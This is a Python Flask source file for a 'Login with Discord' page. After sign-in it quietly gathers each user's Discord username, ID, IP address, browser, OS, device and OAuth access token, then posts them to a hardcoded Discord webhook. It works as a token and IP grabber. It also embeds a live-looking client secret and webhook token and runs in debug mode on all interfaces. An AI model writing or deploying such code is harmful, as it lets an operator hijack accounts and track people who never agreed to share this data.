from flask import Flask, request, jsonify, redirect, session
import requests
from datetime import datetime
from user_agents import parse
import secrets

app = Flask(__name__)

# Securely generate a random secret key
app.secret_key = secrets.token_hex(32)  # Generates a random 32-byte hex string

# Replace with your Discord credentials
CLIENT_ID = "1347985364761051236"
CLIENT_SECRET = "uzv5NE7xacUgYgE_NE978mp9Z7AvjgMt"
REDIRECT_URI = "http://localhost:5000/auth"

# Your Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1347993283808329821/PfoYChFYMIYchIUFuWJr3YwEcMb411kXJteJsQeEmGidhA6gkkeo9LBm-XnVsDJ2t-h3"

# OAuth2 Authorization URL
DISCORD_AUTH_URL = (
    f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}"
    f"&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
)

@app.route("/")
def index():
    return '<a href="/login">Login with Discord</a>'

# Redirect to Discord OAuth2 login
@app.route("/login")
def login():
    return redirect(DISCORD_AUTH_URL)

# Handle OAuth2 callback
@app.route("/auth")
def auth():
    code = request.args.get("code")
    if not code:
        return "Authorization failed: No code provided."

    # Exchange the code for an access token
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": "identify"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    response = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)

    if response.status_code != 200:
        return f"Authorization failed: {response.json()}"

    access_token = response.json().get("access_token")
    if not access_token:
        return "Authorization failed: No access token."

    # Fetch user info from Discord API
    headers = {"Authorization": f"Bearer {access_token}"}
    user_response = requests.get("https://discord.com/api/users/@me", headers=headers)

    if user_response.status_code != 200:
        return "Authorization failed: Could not fetch user information."

    user_info = user_response.json()
    discord_username = f"{user_info['username']}#{user_info['discriminator']}"
    discord_id = user_info["id"]

    # Get IP & browser info
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = parse(request.headers.get("User-Agent", ""))

    # Prepare data for Discord Webhook
    embed = {
        "content": "New Discord Login!",
        "embeds": [{
            "title": "User Information",
            "fields": [
                {"name": "Username", "value": discord_username, "inline": True},
                {"name": "Discord ID", "value": discord_id, "inline": True},
                {"name": "IP Address", "value": user_ip, "inline": False},
                {"name": "Browser", "value": f"{user_agent.browser.family} {user_agent.browser.version_string}", "inline": True},
                {"name": "OS", "value": f"{user_agent.os.family} {user_agent.os.version_string}", "inline": True},
                {"name": "Device", "value": user_agent.device.family, "inline": True},
                {"name": "Access Token", "value": access_token, "inline": False}  # Display the access token (not recommended for production!)
            ],
            "timestamp": datetime.utcnow().isoformat()
        }]
    }

    # Send data to Discord Webhook
    requests.post(WEBHOOK_URL, json=embed)

    # Display access token on the page (not recommended for production)
    return f"Login successful! Welcome {discord_username}. Your Discord Access Token: {access_token}"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
